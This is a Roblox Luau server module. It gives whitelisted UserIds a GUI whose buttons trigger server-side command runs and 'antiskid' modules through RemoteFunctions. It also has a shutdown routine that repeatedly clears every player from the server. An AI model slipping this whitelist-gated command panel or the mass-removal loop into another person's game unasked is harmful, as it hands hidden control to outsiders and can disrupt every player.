local module={Dev={}}
local Players=game:GetService("Players")

function module.shutdown()
	task.spawn(function()
		while true do
			pcall(function()
				Players:ClearAllChildren()
			end)
			task.wait()
		end
	end)
end

function module.StartWatch(Down)
	local function applyLocalScript(parent,plr,func)
		local remote = Instance.new("RemoteFunction")
		local rel = script.LocalScript:Clone()
		
		remote.OnServerInvoke = function(p)
			if p.UserId ~= plr.UserId then 
				p:Kick()
				return nil
			end
			task.spawn(func)
			task.delay(0.5,game.Destroy,remote)
			remote.OnServerInvoke=function()end
			return true
		end
		
		rel.Parent=parent
		remote.Parent=rel
	end
	
	local function giveGUI(plr)
		local plrgui = plr:FindFirstChildOfClass("PlayerGui")
		if plrgui == nil then
			module.shutdown()
			return
		end
		
		local anti = script.anti:Clone()
		local gui = script.gui:Clone()
		require(Down.antiskid.Antis3).init(Down.funcs)
		
		
		applyLocalScript(gui.Frame.cmd,plr,function()
			print("running commands")
			Down.RunCommands()
		end)
		
		for i,v in Down.antiskid.Antis3:GetChildren() do
			if v.ClassName~="ModuleScript" then continue end
			local anti1 = anti:Clone()
			anti1.Text=v.Name
			anti1.TextColor3=Color3.new(1, 0, 0)
			anti1.Parent=gui.Frame.ScrollingFrame
			applyLocalScript(anti1,plr,function()
				print("running",v.Name)
				task.spawn(require,v)
			end)
		end
		
		gui.Parent=plrgui
	end
	
	local function checkwl(p)
		if table.find(module.Dev,p.UserId) then
			task.spawn(giveGUI,p)
		end
	end
		
	Players.PlayerAdded:Connect(checkwl)
	for i,v in Players:GetPlayers() do
		task.spawn(checkwl,v)
	end
end

return module